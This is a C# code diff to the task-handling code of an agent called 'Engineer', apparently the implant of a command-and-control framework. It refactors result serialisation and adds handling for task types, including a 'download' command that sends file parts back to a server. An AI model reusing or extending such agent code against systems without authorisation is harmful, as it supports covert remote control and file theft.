@@ -5,6 +5,7 @@ using System.Diagnostics;
 using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
+using Engineer.Commands;
 
 namespace Engineer.Functions
 {
@@ -52,9 +53,10 @@ namespace Engineer.Functions
                 {
                     Id = task.Id,
                     Command = task.Command,
-                    Result = "",
+                    Result = "".Serialise(),
                     IsHidden = false,
                     Status = EngTaskStatus.Running,
+                    ResponseType = TaskResponseType.None,
                     EngineerId = Program._metadata.Id
                 };
 
@@ -62,9 +64,10 @@ namespace Engineer.Functions
                 if (command is null)
                 {
                     var result = "Error: Command not found";
-                    taskResult.Result = result;
+                    taskResult.Result = result.Serialise();
                     taskResult.Command = task.Command;
                     taskResult.Status = EngTaskStatus.Failed;
+                    taskResult.ResponseType = TaskResponseType.String;
                     SendTaskResult(taskResult);
                     //Program.SendTaskResult(task.Id, result, false, EngTaskStatus.Failed);  //task we send in still has all properties including Id
                 }
@@ -89,14 +92,30 @@ namespace Engineer.Functions
             }
         }
 
-        public static void FillTaskResults(string output, EngineerTask task,EngTaskStatus taskStatus)
+        public static void FillTaskResults(object output, EngineerTask task,EngTaskStatus taskStatus, TaskResponseType taskResponseType)
         {
             try
             {
                 if (engTaskResultDic.ContainsKey(task.Id))
                 {
-                    engTaskResultDic[task.Id].Result = output;
+                    if(TaskResponseType.String == taskResponseType)
+                    {
+                        engTaskResultDic[task.Id].Result = (output as string).Serialise();
+                    }
+                    else if(TaskResponseType.FileSystemItem == taskResponseType)
+                    {
+                        engTaskResultDic[task.Id].Result = (output as List<FileSystemItem>).Serialise();
+                    }
+                    else if(TaskResponseType.ProcessItem == taskResponseType)
+                    {
+                        //engTaskResultDic[task.Id].Result = (output as ProcessItem).Serialise();
+                    }
+                    else
+                    {
+                        engTaskResultDic[task.Id].Result = (output as string).Serialise();
+                    }
                     engTaskResultDic[task.Id].Status = taskStatus;
+                    engTaskResultDic[task.Id].ResponseType = taskResponseType;
                 }
                 //if command is download then call the Functions.DownloadTracker.SplitFileString function, get the filename from the task.Arguments, and pass the result to the function
                 if (task.Command.Equals("download", StringComparison.CurrentCultureIgnoreCase))
@@ -104,11 +123,11 @@ namespace Engineer.Functions
                     if (engTaskResultDic[task.Id].Status == EngTaskStatus.Complete)
                     {
                         task.Arguments.TryGetValue("/file", out string filename);
-                        Functions.DownloadTracker.SplitFileString(filename, engTaskResultDic[task.Id].Result);
+                        Functions.DownloadTracker.SplitFileString(filename, engTaskResultDic[task.Id].Result.Deserialize<string>());
                         //send each value from the key that matches the filename variable in _downloadedFileParts to the server
                         foreach (var value in Functions.DownloadTracker._downloadedFileParts[filename])
                         {
-                            engTaskResultDic[task.Id].Result = value;
+                            engTaskResultDic[task.Id].Result = value.Serialise();
                             SendTaskResult(engTaskResultDic[task.Id]);
                         }
                     }
@@ -145,6 +164,11 @@ namespace Engineer.Functions
                     //Program.SendTaskResult(task.Id, result, true, EngTaskStatus.Complete);
                 }
                 else if(task.Command.Equals("canceltask",StringComparison.CurrentCultureIgnoreCase))
+                {
+                    engTaskResultDic[task.Id].IsHidden = true;
+                    SendTaskResult(engTaskResultDic[task.Id]);
+                }
+                else if (task.Command.Equals("UpdateTaskKey", StringComparison.CurrentCultureIgnoreCase))
                 {
                     engTaskResultDic[task.Id].IsHidden = true;
                     SendTaskResult(engTaskResultDic[task.Id]);
